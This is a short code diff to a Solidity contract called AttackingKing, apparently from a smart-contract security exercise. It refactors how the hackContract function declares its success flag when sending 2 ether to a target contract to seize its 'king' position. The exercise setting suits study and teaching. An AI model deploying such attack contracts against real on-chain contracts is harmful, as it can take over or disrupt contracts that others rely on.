@@ -13,8 +13,7 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        bool ok;
-        (ok,) = contractAddress.call{value: 2 ether}("");
+        (bool ok,) = contractAddress.call{value: 2 ether}("");
         if (!ok) {
             revert("Did not become king");
         }
